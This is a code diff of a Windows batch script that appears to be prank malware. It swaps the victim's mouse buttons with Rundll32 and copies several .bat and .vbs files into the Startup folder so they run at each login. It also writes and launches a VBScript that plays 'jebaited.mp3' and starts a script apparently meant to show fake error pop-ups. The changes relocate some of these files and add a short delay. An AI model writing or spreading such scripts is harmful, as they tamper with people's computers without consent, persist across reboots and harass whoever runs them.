@@ -5,11 +5,13 @@ Rundll32 user32, SwapMouseButton
 
 copy startup.bat "%userprofile%\STARTM~1\Programs\Startup"
 
-copy errors.bat "%userprofile%\STARTM~1\Programs\Startup"
+copy errors.bat "%userprofile%"
 
-copy runerrors.vbs "%userprofile%\STARTM~1\Programs\Startup"
+copy runerrors.vbs "%userprofile%"
 
 copy Msg.vbs "%userprofile%\STARTM~1\Programs\Startup"
+
+copy Msg.vbs "%userprofile%"
 
 copy run.vbs "%userprofile%\STARTM~1\Programs\Startup"
 
@@ -39,6 +41,7 @@ set "file=jebaited.mp3"
   echo wscript.sleep 100
   echo loop
   echo wscript.sleep (int(Sound.currentmedia.duration^)+1^)*1000) >sound.vbs
+  ping localhost -n 2 >NUL
 start /min sound.vbs
 
 start runerrors.vbs
